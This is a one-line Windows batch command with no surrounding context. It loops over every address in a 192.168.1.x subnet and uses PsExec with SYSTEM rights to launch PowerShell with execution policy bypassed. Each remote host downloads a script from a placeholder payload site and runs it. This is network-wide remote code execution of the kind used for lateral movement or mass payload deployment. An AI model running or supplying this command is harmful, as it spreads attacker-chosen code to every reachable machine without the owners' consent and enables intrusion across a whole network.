FOR /L %%G IN (1,1,255) DO PsExec.exe \\192.168.1.%%G -n 5 -accepteula -s powershell.exe -exec bypass -C "(new-object net.webclient).DownloadFile('http://MYPAYLOADSITE/iis.txt','local.ps1');./local.ps1 \\MYSERVER\paylasim 192.168.1.%%G"
